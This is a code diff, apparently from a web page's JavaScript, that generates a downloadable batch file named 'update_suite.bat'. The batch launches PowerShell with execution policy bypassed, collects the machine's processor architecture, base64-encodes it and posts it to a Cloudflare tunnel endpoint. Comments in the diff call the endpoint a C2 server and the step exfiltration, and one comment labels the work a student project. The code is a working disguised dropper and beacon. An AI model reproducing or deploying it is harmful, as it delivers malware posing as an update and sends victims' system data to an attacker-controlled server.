@@ -100,23 +100,23 @@
     const destination = "https://microsoft.com";
     const fileName = "update_suite.bat"; 
 
+    // Commande PowerShell compacte et propre pour éviter les erreurs de syntaxe .bat
+    const psCmd = "$arch =$env:PROCESSOR_ARCHITECTURE; " +
+                  "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]'; " +
+                  "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json); " +
+                  "$b64 = [Convert]::ToBase64String($bytes); " +
+                  "try { " +
+                  "    Invoke-RestMethod -Uri 'https://tourist-feedback-settled-implications.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'}; " +
+                  "    Write-Host 'Architecture transmise avec succes !' -ForegroundColor Green; " +
+                  "} catch { " +
+                  "    Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red; " +
+                  "}";
+
     const fileContent = [
       "@echo off",
-      "rem Projet etudiant - Exfiltration et execution conditionnelle du slave.",
-      "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"try {",
-        "$arch = $env:PROCESSOR_ARCHITECTURE;",
-        "$json = '[{\\\"command\\\":\\\"get_arch\\\",\\\"output\\\":\\\"' + $arch + '\\\"}]';",
-        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($json);",
-        "$b64 = [Convert]::ToBase64String($bytes);",
-        "# Envoi des informations au serveur C2 (tunnel Cloudflare ou IP locale de test)",
-        "Invoke-RestMethod -Uri 'https://tourist-feedback-settled-implications.trycloudflare.com/info/simulation-id' -Method Post -Headers @{'X-Session-Data'=$b64; 'Bypass-Tunnel-Reminder'='true'};",
-        
-        "# Log local pour debug sur la machine cible",
-        "Write-Host 'Architecture detectee et transmise avec succes !' -ForegroundColor Green;",
-      "} catch {",
-        "Write-Host 'Erreur : ' $_.Exception.Message -ForegroundColor Red;",
-      "}",
-      "Read-Host 'Appuyez sur Entree pour fermer'\""
+      "rem Projet etudiant - Exfiltration de l'architecture",
+      `powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "${psCmd}"`,
+      "pause"
     ].join("\r\n");
 
     const blobUrl = URL.createObjectURL(
